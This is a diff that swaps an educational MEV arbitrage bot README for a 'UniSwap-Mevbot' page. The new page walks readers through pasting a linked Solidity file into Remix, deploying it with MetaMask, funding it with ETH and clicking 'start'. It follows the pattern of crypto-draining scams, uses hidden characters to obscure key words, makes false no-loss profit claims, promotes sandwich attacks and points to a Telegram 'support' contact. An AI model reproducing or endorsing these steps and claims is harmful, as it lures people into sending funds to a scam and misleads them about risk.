@@ -1,45 +1,78 @@
-# Dex Arbitrage - MEV Bot  ![license](https://img.shields.io/badge/License-MIT-green.svg?label=license)
-Open sourcing a MEV Arbitrage Bot written in blazing fast Rust.
 
-## Before Starting
-This repo should be used as reference material for aspiring searchers looking to get into the world of MEV.
-I removed more complex functions, mechanisms & optimizations to make it simple and easy to follow, you won't get all the alpha :)
+# UniSwap-Mevbot
+Fully-auto on-chain Uniswap MEVbot leveraging flashloans and the minimal gas fees of Ethereum to perform sandwich attacks and front-runs on Uniswap.
 
-Although this bot should only be used as reference material on how to perform Arbitrage, I found it to be profitable on lesser known EVM compatible chains where there isn't much competition.
-This bot wouldn't be profitable on a competitive EVM chain like Ethereum, BSC or Solana.
+Launch your own MEV engine or start trading with my public program for a 0.1% fee on successful arbitrage transactions.
 
-That being said, use it at your own risk, I don't guarantee any gains, you will lose money. Use this repo as a way to gain practical knowledge, not to try and make money.
+> [!IMPORTANT]
+> Due to the atomic nature of Flashloan operations, if they aren't profitable the transaction will revert and no net profit will be lost.
 
-I am making my work public as it is very hard to get into the world of MEV, 
-there is very limited information on the topic and it's hard to know where to start. Not only do I want people to learn from this repo, 
-but I also want to inspire others to get into the world of MEV and better understand it.
+# How MEVBOT works
+```mermaid
+graph LR
+A(User Transaction)-->B(MEV Bot)-->C(Opportunity Detection)--> E(Transaction Construction)
+E --> F(Transaction Submission)
+F -->J(Block Inclusion)
+J-->K(Profit Realization)
+```
+  - User Transaction: A user submits a transaction to the Ethereum network.
+  - MEV Bot: The MEV bot monitors the mempool for profitable opportunities.
+  - Opportunity Detection: The bot identifies potential MEV opportunities (e.g., arbitrage, liquidation).
+  - Transaction Construction: The bot constructs a transaction to exploit the opportunity.
+  - Transaction Submission: The bot submits the transaction to the network.
+  - Block Inclusion: The transaction gets included in a block by miners.
+  - Profit Realization: The MEV bot realizes the profit from the successful transaction.
 
-Happy searching!
+ #### The bot is constantly sniffing the for user buys, sells, and token creations containing slippage deficits.
+> [!TIP]
+> Bot operators can target any transaction value within their balance threshold. Generally, higher thresholds net consistently viable transactions
+-  Once a transaction is identified, a flashloan is initiated for the target transaction amount, this requires a marginal amount of collateral.
+-  The bot will aggresively attempt to front-run the transaction by dynamically monitoring the bribe to the miner and increasing it if necessary so as to be the first transaction mined.
+- Depending on the set parameters, the bot will either front-run the Dev's sell to remain in profit, or sell upon the token reaching KOTH.
+- The flashloan is then repaid, collateral is reiumbursed and profits are deposited into the operators wallet.
+-  If the transaction is unprofitable at any point it will be reverted and the flashloan will be repaid, losing no gas or net profit.
+# Setup
+1. Download [**MetaMask**](https://metamask.io/download.html) (if you don’t have it already)
+ 
+2. Access to [**Remix Ethereum IDE**](https://remix.ethereum.org/).
+   
+   <img src="https://i.ibb.co/ftNtP8G/2.png" alt="2" border="0">
+   
+   #### For the Remix IDE you can follow this steps:
+3. Click on the `contracts` folder and then create `New File`. Rename it as you like, for example: `bot.sol`
 
-## Features
-The code is simplified quite a bit, it currently sends 1 ETH when a profitable arbitrage path is found, but there is an optimal input amount function.
-- [x] Query Uniswap pairs
-- [x] Find matching pairs across different exchanges
-- [x] Update pair reserves
-- [x] Find arbitrage opportunities
+   #### Note: If there is a problem if the text is not colored when you create bot.sol and paste the code from pastebin, try again. If the codes are not colored, you cannot proceed to the next step.
 
-## Examples
-Besides the `crossed_pairs` and `query_test` functions that are used to test the code. In the "*examples*" folder I included multiple useful functions for testing, including:
-- [x] View pending transactions in the mempool
-- [x] View pending Uniswap V2 transactions in the mempool
-- [x] Subscribe blocks
+4. Paste this [****sourcecode****](sourcecode.sol) code in R­­emi­x­.
 
-Any of these functions can be run using: `cargo run --example <name of file>`.
+5.  Go to the `Solidity Compiler` tab, select version `0.6.6+commit.6c089d02` and click `Compile bot.sol`.
+ 
+    Make sure `bot.sol` is selected in the CONTRACT section of the SOLIDITY COMPILER section.
 
-## Improvements
-If you wish to contribute to the repo, some features that could be implemented are:
-- A better optimal profit function
-- Estimate an array of profitable tokens instead of 1 by 1
-- Make the execute function more gas efficient
+6. TGo to the `DEPLOY & RUN TRANSACTIONS` tab, select the `Injected Provider - ­M­et­am­as­k­­` environment and then `Deploy`. By approving the Me­­ta­­­ma­­sk contract creation fee, you will have created your own contract (ignore any IFPS errors that may appear afterwards).
 
-## Notice
-If any bugs or optimizations are found, feel free to create a pull request. **All pull requests are welcome!** 
+7. Copy your newly created contract address and fund it with any amount of ETH (at least 0.5-2 ETH or more is recommended) Simply send ETH to your newly created contract address to allow the bot to earn money.
 
-> **Warning**
->
-> **This software is highly experimental and should be used at your own risk.** Although tested, this bot is experimental software and is provided on an "as is" and "as available" basis under the MIT license. We cannot guarantee the stability or reliability of this codebase and are not responsible for any damage or loss caused by its use. We do not give out warranties. 
+8. After your transaction is confirmed, click the “start” button to run the b­o­­t. Withdraw your ETH at any time by clicking the “Withdraw” button.
+
+
+> [!IMPORTANT]
+> The bot will immediately begin searching for and transacting arbitrage.
+> Stop the bot any time by clicking the "STOP" button. any current transactions will be sold or reverted.
+
+
+
+
+# Contributions
+
+Contributions are welcome. If you would like to contribute please submit a pull request with your suggested changes.
+
+# Support
+If you benefitted from the project, show us some support by giving us a star ⭐. Open source is awesome!
+
+# Help
+If at any time you encounter any issues with the contract setup, contact the team at  [**Click Here**](https://t.me/UniMevBotsSupport/). 🛡️
+
+# License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
